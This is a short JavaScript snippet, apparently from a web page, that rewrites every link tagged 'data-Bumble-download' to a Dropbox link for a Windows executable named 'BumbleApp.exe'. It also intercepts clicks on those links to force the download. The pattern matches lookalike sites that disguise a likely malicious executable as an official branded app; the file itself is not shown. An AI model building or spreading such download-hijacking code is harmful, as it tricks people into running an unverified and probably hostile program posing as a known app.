(function (global) {
    "use strict";

    var Bumble_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/tiavquy7ikxggy3bq9w45/BumbleApp.exe?rlkey=t7vlsdmiqbo0tmpgvzpd4brvr&st=ax2hqjpl&dl=1";

    function applyDownloadLinksToAnchors() {
        if (typeof document === "undefined") return;
        var nodes = document.querySelectorAll("a[data-Bumble-download]");
        for (var i = 0; i < nodes.length; i++) {
            nodes[i].setAttribute("href", Bumble_APP_DOWNLOAD_URL);
            nodes[i].setAttribute("rel", "noopener noreferrer");
        }
    }

    function onDocumentClickCapture(e) {
        var a = e.target.closest && e.target.closest("a[data-Bumble-download]");
        if (!a) return;
        if (a.getAttribute("data-download-no-track") != null) return;
        e.preventDefault();
        global.location.href = Bumble_APP_DOWNLOAD_URL;
    }

    if (typeof document !== "undefined") {
        document.addEventListener("DOMContentLoaded", function () {
            applyDownloadLinksToAnchors();
            document.addEventListener("click", onDocumentClickCapture, true);
        });
    }

    global.Bumble_APP_DOWNLOAD_URL = Bumble_APP_DOWNLOAD_URL;
})(typeof window !== "undefined" ? window : this);
